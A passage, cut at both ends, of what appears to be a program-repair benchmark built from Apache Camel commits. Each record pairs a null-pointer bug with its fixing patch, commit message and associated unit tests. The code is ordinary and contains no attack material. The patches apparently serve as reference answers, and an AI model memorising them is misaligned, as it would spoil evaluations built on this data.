                "filename": "camel-core/src/main/java/org/apache/camel/builder/PredicateBuilder.java",
                "patch": "@@ -441,4 +441,24 @@ public static Predicate and(List<Predicate> predicates) {\n         }\n         return answer;\n     }\n+\n+    /**\n+     * A constant predicate.\n+     *\n+     * @param answer the constant matches\n+     * @return a predicate that always returns the given answer.\n+     */\n+    public static Predicate constant(final boolean answer) {\n+        return new Predicate() {\n+            @Override\n+            public boolean matches(Exchange exchange) {\n+                return answer;\n+            }\n+\n+            @Override\n+            public String toString() {\n+                return \"\" + answer;\n+            }\n+        };\n+    }\n }",
                "raw_url": "https://github.com/apache/camel/raw/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/main/java/org/apache/camel/builder/PredicateBuilder.java",
                "sha": "3dc5df265820dfc1fcd97cce1b42a9912d27263d",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/main/java/org/apache/camel/language/simple/SimpleExpressionParser.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/language/simple/SimpleExpressionParser.java?ref=11a781af420128e509e7985d0696a6d3cb0ea62b",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/language/simple/SimpleExpressionParser.java",
                "patch": "@@ -79,7 +79,8 @@ protected Expression doParseExpression() {\n         // create and return as a Camel expression\n         List<Expression> expressions = createExpressions();\n         if (expressions.isEmpty()) {\n-            return null;\n+            // return an empty string as response as there was nothing to parse\n+            return ExpressionBuilder.constantExpression(\"\");\n         } else if (expressions.size() == 1) {\n             return expressions.get(0);\n         } else {",
                "raw_url": "https://github.com/apache/camel/raw/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/main/java/org/apache/camel/language/simple/SimpleExpressionParser.java",
                "sha": "abd3d14aaeda18063038aebc948090a735331034",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/main/java/org/apache/camel/language/simple/SimpleLanguage.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/language/simple/SimpleLanguage.java?ref=11a781af420128e509e7985d0696a6d3cb0ea62b",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/language/simple/SimpleLanguage.java",
                "patch": "@@ -21,6 +21,7 @@\n import org.apache.camel.Predicate;\n import org.apache.camel.builder.ExpressionBuilder;\n import org.apache.camel.spi.Language;\n+import org.apache.camel.util.ObjectHelper;\n \n /**\n  * A <a href=\"http://camel.apache.org/simple.html\">simple language</a>\n@@ -126,6 +127,8 @@ public boolean isSingleton() {\n     }\n \n     public Predicate createPredicate(String expression) {\n+        ObjectHelper.notNull(expression, \"expression\");\n+\n         // trim the expression first\n         expression = expression.trim();\n         // support old simple language syntax\n@@ -140,6 +143,8 @@ public Predicate createPredicate(String expression) {\n     }\n \n     public Expression createExpression(String expression) {\n+        ObjectHelper.notNull(expression, \"expression\");\n+\n         // trim the expression first\n         expression = expression.trim();\n         // support old simple language syntax",
                "raw_url": "https://github.com/apache/camel/raw/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/main/java/org/apache/camel/language/simple/SimpleLanguage.java",
                "sha": "3310080c4ca02b343745399f08f61db854753487",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/main/java/org/apache/camel/language/simple/SimplePredicateParser.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/language/simple/SimplePredicateParser.java?ref=11a781af420128e509e7985d0696a6d3cb0ea62b",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/language/simple/SimplePredicateParser.java",
                "patch": "@@ -112,7 +112,8 @@ protected Predicate doParsePredicate() {\n         // create and return as a Camel predicate\n         List<Predicate> predicates = createPredicates();\n         if (predicates.isEmpty()) {\n-            return null;\n+            // return a false predicate as response as there was nothing to parse\n+            return PredicateBuilder.constant(false);\n         } else if (predicates.size() == 1) {\n             return predicates.get(0);\n         } else {",
                "raw_url": "https://github.com/apache/camel/raw/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/main/java/org/apache/camel/language/simple/SimplePredicateParser.java",
                "sha": "1d668917c76a80d41172feeb0308524562593b32",
                "status": "modified"
            },
            {
                "additions": 20,
                "blob_url": "https://github.com/apache/camel/blob/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/test/java/org/apache/camel/language/simple/SimpleTest.java",
                "changes": 20,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/language/simple/SimpleTest.java?ref=11a781af420128e509e7985d0696a6d3cb0ea62b",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/language/simple/SimpleTest.java",
                "patch": "@@ -75,6 +75,26 @@ public void testConstantExpression() throws Exception {\n         assertExpression(\"Hello World\", \"Hello World\");\n     }\n \n+    public void testEmptyExpression() throws Exception {\n+        assertExpression(\"\", \"\");\n+        assertExpression(\" \", \"\");\n+        try {\n+            assertExpression(null, null);\n+            fail(\"Should have thrown exception\");\n+        } catch (IllegalArgumentException e) {\n+            assertEquals(\"expression must be specified\", e.getMessage());\n+        }\n+\n+        assertPredicate(\"\", false);\n+        assertPredicate(\" \", false);\n+        try {\n+            assertPredicate(null, false);\n+            fail(\"Should have thrown exception\");\n+        } catch (IllegalArgumentException e) {\n+            assertEquals(\"expression must be specified\", e.getMessage());\n+        }\n+    }\n+\n     public void testBodyExpression() throws Exception {\n         Expression exp = SimpleLanguage.simple(\"${body}\");\n         assertNotNull(exp);",
                "raw_url": "https://github.com/apache/camel/raw/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/test/java/org/apache/camel/language/simple/SimpleTest.java",
                "sha": "3869f60fbeb96fc86cb7f054fc65c161467886b4",
                "status": "modified"
            },
            {
                "additions": 38,
                "blob_url": "https://github.com/apache/camel/blob/11a781af420128e509e7985d0696a6d3cb0ea62b/components/camel-spring/src/test/java/org/apache/camel/language/SpringSimpleEmptyStringTest.java",
                "changes": 38,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring/src/test/java/org/apache/camel/language/SpringSimpleEmptyStringTest.java?ref=11a781af420128e509e7985d0696a6d3cb0ea62b",
                "deletions": 0,
                "filename": "components/camel-spring/src/test/java/org/apache/camel/language/SpringSimpleEmptyStringTest.java",
                "patch": "@@ -0,0 +1,38 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.language;\n+\n+import org.apache.camel.spring.SpringTestSupport;\n+import org.springframework.context.support.AbstractXmlApplicationContext;\n+import org.springframework.context.support.ClassPathXmlApplicationContext;\n+\n+public class SpringSimpleEmptyStringTest extends SpringTestSupport {\n+\n+    @Override\n+    protected AbstractXmlApplicationContext createApplicationContext() {\n+        return new ClassPathXmlApplicationContext(\"org/apache/camel/language/SpringSimpleEmptyStringTest.xml\");\n+    }\n+    \n+    public void testSimpleEmptyString() throws Exception {\n+        getMockEndpoint(\"mock:result\").expectedBodiesReceived(\"\");\n+\n+        template.sendBody(\"direct:start\", \"Hello World\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/11a781af420128e509e7985d0696a6d3cb0ea62b/components/camel-spring/src/test/java/org/apache/camel/language/SpringSimpleEmptyStringTest.java",
                "sha": "ee0ab16cc0e3a6dbe2e74d01f4f42e34e4358a6b",
                "status": "added"
            },
            {
                "additions": 35,
                "blob_url": "https://github.com/apache/camel/blob/11a781af420128e509e7985d0696a6d3cb0ea62b/components/camel-spring/src/test/resources/org/apache/camel/language/SpringSimpleEmptyStringTest.xml",
                "changes": 35,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring/src/test/resources/org/apache/camel/language/SpringSimpleEmptyStringTest.xml?ref=11a781af420128e509e7985d0696a6d3cb0ea62b",
                "deletions": 0,
                "filename": "components/camel-spring/src/test/resources/org/apache/camel/language/SpringSimpleEmptyStringTest.xml",
                "patch": "@@ -0,0 +1,35 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<beans xmlns=\"http://www.springframework.org/schema/beans\"\n+       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n+       xsi:schemaLocation=\"\n+       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n+       http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd\n+    \">\n+\n+  <camelContext xmlns=\"http://camel.apache.org/schema/spring\">\n+      <route>\n+\t      <from uri=\"direct:start\"/>\n+        <setBody>\n+          <simple></simple>\n+        </setBody>\n+        <to uri=\"mock:result\"/>\n+      </route>\n+  </camelContext>\n+\n+</beans>",
                "raw_url": "https://github.com/apache/camel/raw/11a781af420128e509e7985d0696a6d3cb0ea62b/components/camel-spring/src/test/resources/org/apache/camel/language/SpringSimpleEmptyStringTest.xml",
                "sha": "8b42d66871d4786f925f99e6dd668e567370980e",
                "status": "added"
            }
        ],
        "message": "CAMEL-5005: Fixed NPE when empty expression evaluated by simple language.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1244518 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/92914a8c7204ec020bef70e71118aa0688fd0ead",
        "patched_files": [
            "SimpleExpressionParser.java",
            "Simple.java",
            "SimpleLanguage.java",
            "SimplePredicateParser.java",
            "PredicateBuilder.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SpringSimpleEmptyStringTest.java",
            "SimpleTest.java",
            "PredicateBuilderTest.java"
        ]
    },
    "camel_11e9c70": {
        "bug_id": "camel_11e9c70",
        "commit": "https://github.com/apache/camel/commit/11e9c701d6645c8126b9e5310a499d80c65711f9",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/11e9c701d6645c8126b9e5310a499d80c65711f9/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/SftpOperations.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/SftpOperations.java?ref=11e9c701d6645c8126b9e5310a499d80c65711f9",
                "deletions": 1,
                "filename": "components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/SftpOperations.java",
                "patch": "@@ -696,7 +696,7 @@ public boolean existsFile(String name) throws GenericFileOperationFailedExceptio\n         String directory = FileUtil.onlyPath(name);\n         if (directory == null) {\n             // assume current dir if no path could be extracted\n-            directory = \"\";\n+            directory = \".\";\n         }\n         String onlyName = FileUtil.stripPath(name);\n ",
                "raw_url": "https://github.com/apache/camel/raw/11e9c701d6645c8126b9e5310a499d80c65711f9/components/camel-ftp/src/main/java/org/apache/camel/component/file/remote/SftpOperations.java",
                "sha": "9441b98b2e99b97fa40954653a65677560e18aec",
                "status": "modified"
            },
            {
                "additions": 68,
                "blob_url": "https://github.com/apache/camel/blob/11e9c701d6645c8126b9e5310a499d80c65711f9/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/sftp/SftpProduceTempFileTest.java",
                "changes": 68,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/sftp/SftpProduceTempFileTest.java?ref=11e9c701d6645c8126b9e5310a499d80c65711f9",
                "deletions": 0,
                "filename": "components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/sftp/SftpProduceTempFileTest.java",
                "patch": "@@ -0,0 +1,68 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.file.remote.sftp;\n+\n+import java.io.File;\n+\n+import org.apache.camel.Exchange;\n+import org.apache.camel.util.FileUtil;\n+import org.junit.Ignore;\n+import org.junit.Test;\n+\n+/**\n+ * @version \n+ */\n+@Ignore(\"Disabled due CI servers fails on full build running with these tests\")\n+public class SftpProduceTempFileTest extends SftpServerTestSupport {\n+\n+    @Override\n+    public boolean isUseRouteBuilder() {\n+        return false;\n+    }\n+\n+    @Test\n+    public void testSftpTempFile() throws Exception {\n+        if (!canTest()) {\n+            return;\n+        }\n+\n+        template.sendBodyAndHeader(\"sftp://localhost:\" + getPort() + \"/\" + FTP_ROOT_DIR\n+                + \"?username=admin&password=admin&tempFileName=temp-${file:name}\", \"Hello World\", Exchange.FILE_NAME, \"hello.txt\");\n+\n+        File file = new File(FTP_ROOT_DIR + \"/hello.txt\").getAbsoluteFile();\n+        assertTrue(\"File should exist: \" + file, file.exists());\n+        assertEquals(\"Hello World\", context.getTypeConverter().convertTo(String.class, file));\n+    }\n+\n+    @Test\n+    public void testSftpTempFileNoStartingPath() throws Exception {\n+        if (!canTest()) {\n+            return;\n+        }\n+\n+        template.sendBodyAndHeader(\"sftp://localhost:\" + getPort()\n+                + \"/?username=admin&password=admin&tempFileName=temp-${file:name}\", \"Hello World\", Exchange.FILE_NAME, \"hello.txt\");\n+\n+        File file = new File(\"./hello.txt\").getAbsoluteFile();\n+        assertTrue(\"File should exist: \" + file, file.exists());\n+        assertEquals(\"Hello World\", context.getTypeConverter().convertTo(String.class, file));\n+\n+        // delete file when we are done testing\n+        FileUtil.deleteFile(file);\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/11e9c701d6645c8126b9e5310a499d80c65711f9/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/sftp/SftpProduceTempFileTest.java",
                "sha": "b8fa66b9ff7de69c2fc21b85ca2f7309c957a995",
                "status": "added"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/11e9c701d6645c8126b9e5310a499d80c65711f9/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/sftp/SftpSimpleProduceTest.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/sftp/SftpSimpleProduceTest.java?ref=11e9c701d6645c8126b9e5310a499d80c65711f9",
                "deletions": 1,
                "filename": "components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/sftp/SftpSimpleProduceTest.java",
                "patch": "@@ -25,7 +25,6 @@\n /**\n  * @version \n  */\n-@Ignore(\"Disabled due CI servers fails on full build running with these tests\")\n public class SftpSimpleProduceTest extends SftpServerTestSupport {\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/11e9c701d6645c8126b9e5310a499d80c65711f9/components/camel-ftp/src/test/java/org/apache/camel/component/file/remote/sftp/SftpSimpleProduceTest.java",
                "sha": "bf36a0476e57646cc9ad4018faf441956b6919bb",
                "status": "modified"
            }
        ],
        "message": "CAMEL-3749: Fixed issue with SFTP producer using temp file name and writing with no leading path causing NPE in JCraft SFTP library.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1077904 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/614c80dc5bf26162f8110bc64c7c5230fc8e2922",
        "patched_files": [
            "SftpOperations.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SftpProduceTempFileTest.java",
            "SftpSimpleProduceTest.java"
        ]
    },
    "camel_12d5ca8": {
        "bug_id": "camel_12d5ca8",
        "commit": "https://github.com/apache/camel/commit/12d5ca89c955d3b41a62b5eeb4e7d7e94e14aba1",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/12d5ca89c955d3b41a62b5eeb4e7d7e94e14aba1/components/camel-micrometer/src/main/java/org/apache/camel/component/micrometer/messagehistory/MicrometerMessageHistoryFactory.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-micrometer/src/main/java/org/apache/camel/component/micrometer/messagehistory/MicrometerMessageHistoryFactory.java?ref=12d5ca89c955d3b41a62b5eeb4e7d7e94e14aba1",
                "deletions": 1,
                "filename": "components/camel-micrometer/src/main/java/org/apache/camel/component/micrometer/messagehistory/MicrometerMessageHistoryFactory.java",
                "patch": "@@ -24,6 +24,7 @@\n import org.apache.camel.MessageHistory;\n import org.apache.camel.NamedNode;\n import org.apache.camel.NonManagedService;\n+import org.apache.camel.Route;\n import org.apache.camel.RuntimeCamelException;\n import org.apache.camel.StaticService;\n import org.apache.camel.component.micrometer.MicrometerUtils;\n@@ -102,7 +103,12 @@ public void setNamingStrategy(MicrometerMessageHistoryNamingStrategy namingStrat\n \n     @Override\n     public MessageHistory newMessageHistory(String routeId, NamedNode namedNode, long timestamp) {\n-        return new MicrometerMessageHistory(getMeterRegistry(), camelContext.getRoute(routeId), namedNode, getNamingStrategy(), timestamp);\n+        Route route = camelContext.getRoute(routeId);\n+        if (route != null) {\n+            return new MicrometerMessageHistory(getMeterRegistry(), route, namedNode, getNamingStrategy(), timestamp);\n+        } else {\n+            return null;\n+        }\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/12d5ca89c955d3b41a62b5eeb4e7d7e94e14aba1/components/camel-micrometer/src/main/java/org/apache/camel/component/micrometer/messagehistory/MicrometerMessageHistoryFactory.java",
                "sha": "eb2f5824a6aba4e18402a997af5af11ae108dc67",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/12d5ca89c955d3b41a62b5eeb4e7d7e94e14aba1/components/camel-micrometer/src/test/java/org/apache/camel/component/micrometer/messagehistory/ExceptionRouteMicrometerMessageHistoryTest.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-micrometer/src/test/java/org/apache/camel/component/micrometer/messagehistory/ExceptionRouteMicrometerMessageHistoryTest.java?ref=12d5ca89c955d3b41a62b5eeb4e7d7e94e14aba1",
                "deletions": 2,
                "filename": "components/camel-micrometer/src/test/java/org/apache/camel/component/micrometer/messagehistory/ExceptionRouteMicrometerMessageHistoryTest.java",
                "patch": "@@ -56,7 +56,7 @@ public void testMetricsHistory() throws Exception {\n         assertMockEndpointsSatisfied();\n \n         // there should be 3 names\n-        assertEquals(5, registry.getMeters().size());\n+        assertEquals(3, registry.getMeters().size());\n \n         // get the message history service\n         MicrometerMessageHistoryService service = context.hasService(MicrometerMessageHistoryService.class);\n@@ -67,7 +67,6 @@ public void testMetricsHistory() throws Exception {\n \n         assertTrue(json.contains(\"\\\"nodeId\\\" : \\\"foo\\\"\"));\n         assertTrue(json.contains(\"\\\"nodeId\\\" : \\\"bar\\\"\"));\n-        assertTrue(json.contains(\"\\\"nodeId\\\" : \\\"exception\\\"\"));\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/12d5ca89c955d3b41a62b5eeb4e7d7e94e14aba1/components/camel-micrometer/src/test/java/org/apache/camel/component/micrometer/messagehistory/ExceptionRouteMicrometerMessageHistoryTest.java",
                "sha": "281e286d518af326b82db4ed59543cac0673d467",
                "status": "modified"
            }
        ],
        "message": "Fixed micrometer NPE",
        "parent": "https://github.com/apache/camel/commit/27d1af9a62090aeae57b966abbef540671d68a94",
        "patched_files": [
            "MicrometerMessageHistoryFactory.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ExceptionRouteMicrometerMessageHistoryTest.java"
        ]
    },
    "camel_169b981": {
        "bug_id": "camel_169b981",
        "commit": "https://github.com/apache/camel/commit/169b981e4552a3a38fe350a1466493e19372573a",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/169b981e4552a3a38fe350a1466493e19372573a/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java?ref=169b981e4552a3a38fe350a1466493e19372573a",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "patch": "@@ -185,7 +185,7 @@ public void changeFileName(String newName) {\n \n         // Make sure the names is normalized.\n         String newFileName = FileUtil.normalizePath(newName);\n-        String newEndpointPath = FileUtil.normalizePath(endpointPath);\n+        String newEndpointPath = FileUtil.normalizePath(endpointPath.endsWith(\"\" + File.separatorChar) ? endpointPath : endpointPath + File.separatorChar);\n \n         LOG.trace(\"Normalized endpointPath: {}\", newEndpointPath);\n         LOG.trace(\"Normalized newFileName: ()\", newFileName);",
                "raw_url": "https://github.com/apache/camel/raw/169b981e4552a3a38fe350a1466493e19372573a/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "sha": "e5175502258a2cd410cba6098eb141b774fccac6",
                "status": "modified"
            },
            {
                "additions": 63,
                "blob_url": "https://github.com/apache/camel/blob/169b981e4552a3a38fe350a1466493e19372573a/camel-core/src/test/java/org/apache/camel/component/file/FileMoveAndMoveFailedIssueTest.java",
                "changes": 63,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/file/FileMoveAndMoveFailedIssueTest.java?ref=169b981e4552a3a38fe350a1466493e19372573a",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/file/FileMoveAndMoveFailedIssueTest.java",
                "patch": "@@ -0,0 +1,63 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.file;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.builder.RouteBuilder;\n+\n+public class FileMoveAndMoveFailedIssueTest extends ContextTestSupport {\n+\n+    @Override\n+    protected void setUp() throws Exception {\n+        deleteDirectory(\"target/input\");\n+        super.setUp();\n+    }\n+\n+    public void testMove() throws Exception {\n+        getMockEndpoint(\"mock:result\").expectedMessageCount(1);\n+        getMockEndpoint(\"mock:result\").expectedFileExists(\"target/input/target/input.bak/somedate/hello.txt\");\n+\n+        template.sendBodyAndHeader(\"file:target/input\", \"Hello World\", Exchange.FILE_NAME, \"hello.txt\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    public void testMoveFailed() throws Exception {\n+        getMockEndpoint(\"mock:result\").expectedMessageCount(0);\n+        getMockEndpoint(\"mock:result\").expectedFileExists(\"target/input/target/input.err/somedate/bomb.txt\");\n+\n+        template.sendBodyAndHeader(\"file:target/input\", \"Kaboom\", Exchange.FILE_NAME, \"bomb.txt\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"file:./target/input?move=${file:parent}.bak/somedate/${file:onlyname}&moveFailed=${file:parent}.err/somedate/${file:onlyname}\")\n+                    .convertBodyTo(String.class)\n+                    .filter(body().contains(\"Kaboom\"))\n+                        .throwException(new IllegalArgumentException(\"Forced\"))\n+                    .end()\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/169b981e4552a3a38fe350a1466493e19372573a/camel-core/src/test/java/org/apache/camel/component/file/FileMoveAndMoveFailedIssueTest.java",
                "sha": "a9d8ece75b57a69411576540452269596f48533a",
                "status": "added"
            }
        ],
        "message": "CAMEL-9238: Fixed potential NPE in file rename when using move/moveFailed.",
        "parent": "https://github.com/apache/camel/commit/678252004165755c64bfca78f150718538f994df",
        "patched_files": [
            "GenericFile.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "FileMoveAndMoveFailedIssueTest.java"
        ]
    },
    "camel_18f8d29": {
        "bug_id": "camel_18f8d29",
        "commit": "https://github.com/apache/camel/commit/18f8d29f985746e5b5afa7f7b26564c5be564d5c",
        "file": [
            {
                "additions": 155,
                "blob_url": "https://github.com/apache/camel/blob/18f8d29f985746e5b5afa7f7b26564c5be564d5c/camel-core/src/main/java/org/apache/camel/util/EventHelper.java",
                "changes": 199,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/EventHelper.java?ref=18f8d29f985746e5b5afa7f7b26564c5be564d5c",
                "deletions": 44,
                "filename": "camel-core/src/main/java/org/apache/camel/util/EventHelper.java",
                "patch": "@@ -27,6 +27,7 @@\n import org.apache.camel.StatefulService;\n import org.apache.camel.spi.EventFactory;\n import org.apache.camel.spi.EventNotifier;\n+import org.apache.camel.spi.ManagementStrategy;\n import org.slf4j.Logger;\n import org.slf4j.LoggerFactory;\n \n@@ -43,7 +44,12 @@ private EventHelper() {\n     }\n \n     public static void notifyCamelContextStarting(CamelContext context) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -53,7 +59,7 @@ public static void notifyCamelContextStarting(CamelContext context) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -66,7 +72,12 @@ public static void notifyCamelContextStarting(CamelContext context) {\n     }\n \n     public static void notifyCamelContextStarted(CamelContext context) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -76,7 +87,7 @@ public static void notifyCamelContextStarted(CamelContext context) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -89,7 +100,12 @@ public static void notifyCamelContextStarted(CamelContext context) {\n     }\n \n     public static void notifyCamelContextStartupFailed(CamelContext context, Throwable cause) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -99,7 +115,7 @@ public static void notifyCamelContextStartupFailed(CamelContext context, Throwab\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -112,7 +128,12 @@ public static void notifyCamelContextStartupFailed(CamelContext context, Throwab\n     }\n \n     public static void notifyCamelContextStopping(CamelContext context) {\n-        List<EventNotifier> notifiers = context.getManagementStrategy().getEventNotifiers();\n+        ManagementStrategy management = context.getManagementStrategy();\n+        if (management == null) {\n+            return;\n+        }\n+\n+        List<EventNotifier> notifiers = management.getEventNotifiers();\n         if (notifiers == null || notifiers.isEmpty()) {\n             return;\n         }\n@@ -122,7 +143,7 @@ public static void notifyCamelContextStopping(CamelContext context) {\n                 continue;\n             }\n \n-            EventFactory factory = context.getManagementStrategy().getEventFactory();\n+            EventFactory factory = management.getEventFactory();\n             if (factory == null) {\n                 return;\n             }\n@@ -135,7 +156,12 @@ public static void notifyCamelContextStopping(CamelContext context) {\n     }\n \n     public static void 